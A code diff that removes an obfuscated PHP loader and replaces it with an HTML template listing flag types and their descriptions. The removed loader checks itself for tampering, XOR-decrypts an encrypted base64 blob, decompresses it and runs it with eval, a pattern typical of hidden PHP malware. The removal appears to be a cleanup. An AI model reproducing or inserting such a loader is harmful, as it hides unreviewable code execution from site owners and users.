@@ -1,24 +1,14 @@
-<?php
-$mwhqjoa="359e43ef6e7deb2b323c36c6cce8fc77";
-$gpbrbllcj="51575a04070707575304555006550a500b0555515706020e5a57040854070100";
-$eercdbg="Grju8/JephF1542x3fQYs4ywOxuQ5KfceKLTaK+gt/PquObfTuGGIdfAzxOmWMTNR6sg4WnkSXspmH7VIiowcBUw0OyhGBjnW18ibi7QtLFGwU6n5ZdLi+7MjACyaGbSf+p1S4HJns1jvDhiKUAquTpy+uriyuR0X8IFkVt+Fk9HenzdR7J2HmyZ5q7dEeZGWsYVm5cjlH9LQRwJCV8GpwF2D2JrDQMwvdwsahBdva2FV7diXFewQh5ue5IbrPkmF3TKjuHFdt466BHDsvH74t6CW8C5wBVJuY9MnQNMeRmwuO7niAteX6qqapS23CyOr2g4unuYCaXJ";
-$gdpqrlqc=file_get_contents(__FILE__);
-$wxurskzq=str_replace($eercdbg,"",$gdpqrlqc);
-if(strpos($wxurskzq,"ec"."ho")!==false||strpos($wxurskzq,"pr"."int")!==false||strpos($wxurskzq,"var_"."dump")!==false||strpos($wxurskzq,"file_put_"."contents")!==false||strpos($wxurskzq,"fw"."rite")!==false){die();}
-$eakxoa=str_replace(array($mwhqjoa,$gpbrbllcj),array("SP_1601eb5d","KP_84400fc7"),$gdpqrlqc);
-$hhgzxwl=md5($eakxoa);
-$smhsjxsubf=hex2bin($gpbrbllcj);
-$gwxiydot="";
-$tbkdabuo=strlen($hhgzxwl);
-for($czteobwv=0;$czteobwv<$tbkdabuo;$czteobwv++){
-$gwxiydot.=chr(ord($smhsjxsubf[$czteobwv])^ord($hhgzxwl[$czteobwv]));
-}
-$fkyfwlee=base64_decode($eercdbg);
-$hdgmklpbw=strlen($fkyfwlee);
-$dbwdjvjo="";
-$uvrardm=strlen($gwxiydot);
-for($czteobwv=0;$czteobwv<$hdgmklpbw;$czteobwv++){
-$dbwdjvjo.=$fkyfwlee[$czteobwv]^$gwxiydot[$czteobwv%$uvrardm];
-}
-$getnbjm="gzun"."compress";
-eval('?>' . $getnbjm($dbwdjvjo) . '<?php ');
+<div class="flags-help-container">
+    <?php foreach ($flag_types as $type => $info): ?>
+        <div class="flag-help-item">
+            <div class="flag-help-icon">
+                <img src="/graphic/flags/medium/<?= $info['icon'] ?>_1.png" alt="<?= $info['name'] ?>"
+                    onerror="this.src='/graphic/flags/flag_disabled.png'">
+            </div>
+            <div class="flag-help-content">
+                <h4><?= $info['name'] ?></h4>
+                <p><?= $info['description'] ?></p>
+            </div>
+        </div>
+    <?php endforeach; ?>
+</div>
